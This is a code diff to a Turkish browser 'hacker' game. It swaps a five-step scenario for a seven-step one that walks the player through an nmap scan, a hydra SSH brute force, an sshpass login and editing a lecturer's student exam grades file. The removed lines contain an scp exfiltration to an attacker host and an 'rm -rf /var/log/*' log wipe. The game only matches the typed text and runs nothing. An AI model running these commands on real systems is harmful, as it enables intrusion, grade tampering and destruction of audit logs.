@@ -592,6 +592,41 @@
       background: rgba(0, 255, 0, 0.2);
       transform: translateX(5px);
     }
+
+    .nano-editor {
+      background: #000;
+      border: 1px solid var(--primary-color);
+      margin: 10px 0;
+      padding: 5px;
+      font-family: 'Fira Code', monospace;
+    }
+
+    .editor-header {
+      color: var(--primary-color);
+      border-bottom: 1px solid var(--primary-color);
+      padding: 5px;
+      margin-bottom: 5px;
+    }
+
+    .editor-content {
+      white-space: pre;
+      padding: 5px;
+      min-height: 200px;
+      color: var(--text-color);
+    }
+
+    .editor-footer {
+      border-top: 1px solid var(--primary-color);
+      padding: 5px;
+      display: flex;
+      justify-content: space-between;
+      color: var(--primary-color);
+    }
+
+    .cursor {
+      background: var(--primary-color);
+      color: #000;
+    }
   </style>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -619,7 +654,7 @@
       <div class="progress-bar-fill"></div>
     </div>
   </div>
-  <div class="current-task">Görev 1/5</div>
+  <div class="current-task">Görev 1/7</div>
 </div>
 
 <div class="hacked-profs">
@@ -658,6 +693,9 @@ document.addEventListener("DOMContentLoaded", function () {
   let commandHistoryIndex = -1;
   let commandHistoryList = [];
   let score = 0;
+  let isEditorMode = false;
+  let currentEditorContent = '';
+  let currentCursorPosition = 0;
 
   // Ses efektleri
   const sounds = {
@@ -669,10 +707,12 @@ document.addEventListener("DOMContentLoaded", function () {
 
   const ogreticiNotlar = [
     "💡 DHCP komutu: 'dhcp-discover' ile başlar ve '--interface eth0' parametresi ile devam eder. Bu komut ağdaki DHCP sunucusundan IP adresi ister.",
-    "💡 Kullanıcı adı genellikle ad.soyad formatındadır. Zayıf şifreler genelde basit sayı dizileridir (örn: 123456).",
-    "💡 find komutu ile dosya aramak için: 'find [dizin] -name [dosya_adı]' formatını kullan. Örnek: find /home/kullanici -name 'dosya.txt'",
-    "💡 Dosya transferi için 'scp' komutu kullanılır. Dosya değiştirmek için 'sed' komutu kullanılır. Örnek: scp dosya.txt kullanici@sunucu:/hedef && sed -i 's/eski/yeni/g' dosya.txt",
-    "💡 Log dosyalarını silmek için 'rm -rf' komutu kullanılır. Tüm loglar genelde /var/log/ dizininde bulunur."
+    "💡 Nmap ile ağ taraması yapmak için: 'nmap -sn [ağ_adresi]' formatını kullan. Örnek: nmap -sn 10.16.0.0/24",
+    "💡 Hydra ile parola kırmak için: 'hydra -l [kullanıcı] -P [wordlist] [servis]://[hedef]' formatını kullan.",
+    "💡 sshpass ile otomatik SSH bağlantısı için: 'sshpass -p [parola] ssh [kullanıcı]@[hedef]' formatını kullan.",
+    "💡 locate komutu ile dosya aramak için: 'locate [dosya_adı]' formatını kullan.",
+    "💡 nano editörü ile dosya düzenlemek için: 'nano [dosya_yolu]' formatını kullan. Kaydetmek için CTRL+O, çıkmak için CTRL+X",
+    "💡 Oturumu kapatmak için 'exit' komutunu kullan."
   ];
 
   const görevler = [
@@ -682,24 +722,86 @@ document.addEventListener("DOMContentLoaded", function () {
       yanıt: "IP adresi alındı: 10.16.23.48  [✔]"
     },
     {
-      soru: ">> GÖREV #2: Yerel ağda Tunahan Timuçin'in cihazını tespit et. Doğru kullanıcı adı ve parola kombinasyonunu bul:",
-      cevap: "t.timucin 123456",
-      yanıt: "Erişim sağlandı. [✔]"
+      soru: ">> GÖREV #2: Yerel ağdaki cihazları tespit etmek için doğru Nmap komutunu gir.\n>> Komut: ________ -sn ______",
+      cevap: "nmap -sn 10.16.0.0/24",
+      yanıt: "Ağ taraması tamamlandı: 10.16.0.88 (t.timucin cihazı) bulundu.  [✔]"
     },
     {
-      soru: ">> GÖREV #3: Vize notlarını içeren .txt dosyasını bul. Komutu gir:",
-      cevap: "find /home/t.timucin -name \"vize_notlari.txt\"",
-      yanıt: "Dosya bulundu: /home/t.timucin/Desktop/vize_notlari.txt  [✔]"
+      soru: ">> GÖREV #3: SSH üzerinden hedef cihazda oturum açmak için doğru Hydra komutunu gir.\n>> Komut: hydra -l ______ -P ______ /usr/share/wordlists/deneneceksifreler.txt ssh://_____",
+      cevap: "hydra -l t.timucin -P /usr/share/wordlists/deneneceksifreler.txt ssh://10.16.0.88",
+      yanıt: "Parola bulundu: 123456  [✔]"
     },
     {
-      soru: ">> GÖREV #4: Dosyayı transfer et ve notu değiştir. Komutu gir:",
-      cevap: "scp vize_notlari.txt attacker@10.16.66.6:/hacked && sed -i 's/48/88/g' vize_notlari.txt",
-      yanıt: "Dosya transfer edildi ve değiştirildi. [✔]"
+      soru: ">> GÖREV #4: Hedef cihazda SSH ile oturum açmak için sshpass kullanarak tek komutta bağlanın.\n>> Komut: ______",
+      cevap: "sshpass -p 123456 ssh t.timucin@10.16.0.88",
+      yanıt: "SSH bağlantısı kuruldu.  [✔]"
     },
     {
-      soru: ">> GÖREV #5: Tüm logları temizle. Komutu gir:",
-      cevap: "rm -rf /var/log/*",
-      yanıt: "Loglar temizlendi. [✔]\n\nTüm görevler başarıyla tamamlandı. Ağdan güvenli şekilde çıkılıyor..."
+      soru: ">> GÖREV #5: Hedef cihazda sınav notları dosyasını bulmak için doğru locate komutunu gir.\n>> Komut: locate ______",
+      cevap: "locate exam_notes.txt",
+      yanıt: "Dosya bulundu: /home/t.timucin/Documents/organizasyon_vize.txt  [✔]"
+    },
+    {
+      soru: ">> GÖREV #6: exam_notes.txt dosyasını terminal editörüyle açın, 6 öğrencinin notlarını güncelleyin, kaydedip çıkın.",
+      cevap: "nano /home/t.timucin/Documents/organizasyon_vize.txt",
+      yanıt: "Editör açıldı; notlar güncellendi ve dosya kaydedilip kapatıldı.  [✔]",
+      editorContent: `# Organizasyon Vize Notları
+# Dosya: /home/t.timucin/Documents/organizasyon_vize.txt
+
+# Öğrenci Notları:
+1. Ali Yılmaz=65  
+2. Ayşe Demir=72  
+3. Mehmet Kaya=58  
+4. Zeynep Şahin=85  
+5. Can Öztürk=70  
+6. Deniz Yıldız=63  
+7. Fatma Koç=78  
+8. Emre Arslan=92  
+9. Yunus Akıncı=40 
+10. Arif Yarencik =25
+11. Özlem Uçar=69  
+12. Berk Kaplan=74  
+13. Selin Tuna=88  
+14. Suat Çobankaya=59  
+15. Melis Kaya=93  
+16. Onur Yılmaz=67  
+17. Tuğçe Akın=79  
+18. Enes Güçlü = 22  
+19. Gökhan Acar=77  
+20. Elvan Tekin=66  
+21. Sinem Arı=90  
+22. Kaan Demirci=55  
+23. Derya Uysal=82  
+24. Tolga Ergin=61  
+25. Büşra Çetin=94  
+26. Seçkin Yılmaz=73  
+27. Rabia Kara=68  
+28. Cihan Altun=88  
+29. Nisanur Kaplan=60  
+30. Barış Şen=79  
+31. Eren Kablan=30 
+32. Efe Yıldırım=68  
+33. Dilan Aydın=74  
+34. Emir Demirel=88  
+35. Dilara Güneş=64  
+36. Ozan Kurt=79  
+37. Merve Özkan=57  
+38. Fırat Şahin=83  
+39. Şeyma Demirtaş=90  
+40. Kemal Can=52  
+
+# Not: Notları güncellemek için yukarı/aşağı ok tuşları ile hareket edin
+#      Değişiklik yapmak için sayıları düzenleyin
+#      Kaydetmek için CTRL+O, çıkmak için CTRL+X
+
+^G Yardım    ^O Kaydet    ^W Ara        ^K Kes        ^X Çıkış
+^X Dosyadan Çıkış`,
+      editorMode: true
+    },
+    {
+      soru: ">> GÖREV #7: Hedef cihazdan güvenli bir şekilde çıkış yapmak için doğru komutu gir.\n>> Komut: ______",
+      cevap: "exit",
+      yanıt: "SSH oturumu kapatıldı, yerel makineye dönüldü.  [✔]"
     }
   ];
 
@@ -718,10 +820,12 @@ document.addEventListener("DOMContentLoaded", function () {
   // Komut ipuçları
   const commandHints = {
     'dhcp-discover': 'Ağ arayüzü üzerinden DHCP keşfi başlatır',
-    'find': 'Dosya arama komutu',
-    'scp': 'Güvenli dosya kopyalama',
-    'sed': 'Metin düzenleme aracı',
-    'rm': 'Dosya silme komutu',
+    'nmap': 'Ağ tarama aracı',
+    'hydra': 'Parola kırma aracı',
+    'sshpass': 'SSH parola ile otomatik giriş',
+    'locate': 'Dosya arama komutu',
+    'nano': 'Metin editörü',
+    'exit': 'Oturumu kapat',
     'ipucu': 'Mevcut görev için ipucu al',
     'yardım': 'Komut listesini göster',
     'çık': 'Sistemden çıkış yap'
@@ -1050,7 +1154,125 @@ document.addEventListener("DOMContentLoaded", function () {
     return rastgeleCevap(aiCevaplar[tip], tip);
   }
 
+  // Terminal editörü için yeni fonksiyonlar ekleyelim
+  function showNanoEditor(content) {
+    const editorDiv = document.createElement('div');
+    editorDiv.className = 'nano-editor';
+    editorDiv.innerHTML = `
+      <div class="editor-header">GNU nano 6.2</div>
+      <div class="editor-content" contenteditable="true" spellcheck="false"></div>
+      <div class="editor-footer">
+        <span>^G Yardım</span>
+        <span>^O Kaydet</span>
+        <span>^W Ara</span>
+        <span>^K Kes</span>
+        <span>^X Çıkış</span>
+      </div>
+    `;
+    terminal.appendChild(editorDiv);
+    
+    const editorContent = editorDiv.querySelector('.editor-content');
+    editorContent.textContent = content;
+    
+    // Editör modunu aktifleştir
+    isEditorMode = true;
+    currentEditorContent = content;
+    
+    // Editör stillerini güncelle
+    const style = document.createElement('style');
+    style.textContent = `
+      .nano-editor {
+        background: #000;
+        border: 1px solid var(--primary-color);
+        margin: 10px 0;
+        padding: 5px;
+        font-family: 'Fira Code', monospace;
+      }
+      .editor-header {
+        color: var(--primary-color);
+        border-bottom: 1px solid var(--primary-color);
+        padding: 5px;
+        margin-bottom: 5px;
+      }
+      .editor-content {
+        white-space: pre;
+        padding: 5px;
+        min-height: 200px;
+        color: var(--text-color);
+        outline: none;
+        caret-color: var(--primary-color);
+      }
+      .editor-content:focus {
+        box-shadow: 0 0 5px var(--primary-color);
+      }
+      .editor-footer {
+        border-top: 1px solid var(--primary-color);
+        padding: 5px;
+        display: flex;
+        justify-content: space-between;
+        color: var(--primary-color);
+      }
+    `;
+    document.head.appendChild(style);
+
+    // Editör içeriğini güncelle
+    editorContent.addEventListener('input', (e) => {
+      currentEditorContent = e.target.textContent;
+    });
+
+    // CTRL+O ve CTRL+X kısayollarını ekle
+    editorContent.addEventListener('keydown', (e) => {
+      if (e.ctrlKey) {
+        if (e.key === 'o') {
+          e.preventDefault();
+          saveFile();
+        } else if (e.key === 'x') {
+          e.preventDefault();
+          exitEditor();
+        }
+      }
+    });
+
+    // Editöre odaklan
+    editorContent.focus();
+  }
+
+  function saveFile() {
+    const successDiv = document.createElement('div');
+    successDiv.innerHTML = 'Dosya kaydedildi: /home/t.timucin/Documents/organizasyon_vize.txt';
+    successDiv.className = 'success-text';
+    terminal.appendChild(successDiv);
+  }
+
+  function exitEditor() {
+    isEditorMode = false;
+    const editorDiv = document.querySelector('.nano-editor');
+    if (editorDiv) {
+      editorDiv.remove();
+    }
+    
+    const completeDiv = document.createElement('div');
+    completeDiv.innerHTML = 'Editör kapatıldı. Değişiklikler kaydedildi.';
+    completeDiv.className = 'success-text';
+    terminal.appendChild(completeDiv);
+    
+    // Görevi tamamla
+    görevIndex++;
+    updateTaskStatus();
+    
+    if (görevIndex < görevler.length) {
+      const nextTaskDiv = document.createElement('div');
+      nextTaskDiv.innerHTML = görevler[görevIndex].soru;
+      nextTaskDiv.className = 'task-container';
+      terminal.appendChild(nextTaskDiv);
+    }
+  }
+
   input.addEventListener("keydown", (e) => {
+    if (isEditorMode) {
+      handleEditorKeyPress(e);
+      return;
+    }
     if (e.key === "Enter") {
       const komut = input.value.trim().toLowerCase().replace(/[üu]/g, 'u').replace(/[ıi]/g, 'i');
       
@@ -1066,38 +1288,42 @@ document.addEventListener("DOMContentLoaded", function () {
       const aktifGörev = görevler[görevIndex];
 
       if (aktifGörev && komut === aktifGörev.cevap.toLowerCase()) {
-        const successDiv = document.createElement('div');
-        successDiv.innerHTML = aktifGörev.yanıt;
-        successDiv.className = 'success-text';
-        terminal.appendChild(successDiv);
-
-        const learnDiv = document.createElement('div');
-        learnDiv.innerHTML = `📘 Öğren: ${ogreticiNotlar[görevIndex]}`;
-        learnDiv.className = 'warning-text';
-        terminal.appendChild(learnDiv);
-
-        görevIndex++;
-        
-        if (görevIndex < görevler.length) {
-          const nextTaskDiv = document.createElement('div');
-          nextTaskDiv.innerHTML = görevler[görevIndex].soru;
-          nextTaskDiv.className = 'task-container';
-          terminal.appendChild(nextTaskDiv);
-
-          if (görevIndex === 3) {
-            hızKatı = 2;
-            const warningDiv = document.createElement('div');
-            warningDiv.innerHTML = '>> Sistem güvenliği güçleniyor! Zaman iki kat hızlanıyor! ⏱';
-            warningDiv.className = 'warning-text';
-            terminal.appendChild(warningDiv);
-          }
+        if (aktifGörev.editorMode) {
+          showNanoEditor(aktifGörev.editorContent);
         } else {
-          const completeDiv = document.createElement('div');
-          completeDiv.innerHTML = '>> Tüm görevler başarıyla tamamlandı. Sistem kontrolü sağlanıyor...<br>> [exit] yazarsan sistemden çıkış yapılır.';
-          completeDiv.className = 'success-text';
-          terminal.appendChild(completeDiv);
+          const successDiv = document.createElement('div');
+          successDiv.innerHTML = aktifGörev.yanıt;
+          successDiv.className = 'success-text';
+          terminal.appendChild(successDiv);
+
+          const learnDiv = document.createElement('div');
+          learnDiv.innerHTML = `📘 Öğren: ${ogreticiNotlar[görevIndex]}`;
+          learnDiv.className = 'warning-text';
+          terminal.appendChild(learnDiv);
+
+          görevIndex++;
+          
+          if (görevIndex < görevler.length) {
+            const nextTaskDiv = document.createElement('div');
+            nextTaskDiv.innerHTML = görevler[görevIndex].soru;
+            nextTaskDiv.className = 'task-container';
+            terminal.appendChild(nextTaskDiv);
+
+            if (görevIndex === 3) {
+              hızKatı = 2;
+              const warningDiv = document.createElement('div');
+              warningDiv.innerHTML = '>> Sistem güvenliği güçleniyor! Zaman iki kat hızlanıyor! ⏱';
+              warningDiv.className = 'warning-text';
+              terminal.appendChild(warningDiv);
+            }
+          } else {
+            const completeDiv = document.createElement('div');
+            completeDiv.innerHTML = '>> Tüm görevler başarıyla tamamlandı. Sistem kontrolü sağlanıyor...<br>> [exit] yazarsan sistemden çıkış yapılır.';
+            completeDiv.className = 'success-text';
+            terminal.appendChild(completeDiv);
+          }
+          updateTaskStatus();
         }
-        updateTaskStatus();
       } else if (komut in extraKomutlar) {
         const yanıt = typeof extraKomutlar[komut] === "function" ? extraKomutlar[komut]() : extraKomutlar[komut];
         const aiDiv = document.createElement('div');
